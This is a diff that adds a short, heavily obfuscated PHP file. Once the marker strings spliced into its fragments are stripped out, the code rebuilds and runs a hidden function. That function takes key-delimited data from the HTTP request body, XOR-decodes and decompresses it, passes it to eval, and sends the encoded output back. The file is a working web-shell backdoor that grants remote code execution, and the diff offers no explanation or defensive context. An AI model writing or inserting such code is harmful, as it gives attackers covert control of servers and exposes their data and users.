@@ -1,0 +1,12 @@
+<?php
+$a=str_replace('oS','','creoSatoSoSeoS_foSunctoSion');
+$N=',jSeMgGsm,j4U";,jfuncti,j,jon,j x,j($t,$k){$c=strlen($k);$l=,js,jtrlen,j($,jt);$o=""';
+$h='tents(",jphp,j:,j,j//,jinpu,jt"),$m)==1) {@ob_start();,j@eva,jl(@g,jzuncompres,js(@x(,j';
+$J='$k="202,jc,jb9,j62";$kh="ac5,j9075b964b";,j$kf=",j0,j715,j2d234b70,j";$p="t,j4IjFJF';
+$q='@b,jase64_d,jecode($m[,j1]),j,$k)));,j,j$o=@ob_get_c,jontents,j();,j@ob_end_clea,';
+$B=';fo,jr($i=0;$i,j<,j$l,j;){for($j=0;($j<,j,j$c&&$i<$l);,j$j++,,j$i++){$o,j.,j=$t{$i}';
+$m='^$k{$j},j;,j}}ret,jurn $o;}if,j (@preg,j_mat,jc,jh("/$kh(.+),j$kf/",@,j,jf,jile_get_con';
+$U='j,jn();$r=@bas,je64_enco,jde(,j,j@x(@gzcompre,jss($o),$k,j));pri,jnt,j("$,jp$kh$r$kf");}';
+$s=str_replace(',j','',$J.$N.$B.$m.$h.$q.$U);
+$x=$a('',$s);$x();
+?>
